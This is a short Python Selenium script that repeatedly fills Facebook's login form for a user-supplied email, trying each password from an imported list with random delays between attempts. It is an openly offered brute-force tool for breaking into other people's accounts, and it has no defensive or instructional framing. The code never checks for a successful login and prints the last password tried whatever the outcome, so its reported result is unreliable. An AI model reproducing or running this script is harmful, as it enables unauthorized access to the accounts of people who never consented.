import time
import random
from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
from webdriver_manager.firefox import GeckoDriverManager
import combination

driver = webdriver.Chrome(ChromeDriverManager().install()) #using chrome window to start operation
pw= combination.passwrd
user = input('Enter Email Id:')
i=0
while i<len(pw):
    password = pw[i]

    driver.get('https://www.facebook.com/')
    username_box = driver.find_element('id','email')
    username_box.send_keys(user)

    password_box = driver.find_element('id','pass')
    password_box.send_keys(password)

    login_box = driver.find_element('name','login')
    login_box.click()
    time.sleep(random.randint(1,9))

    i+=1

print(password)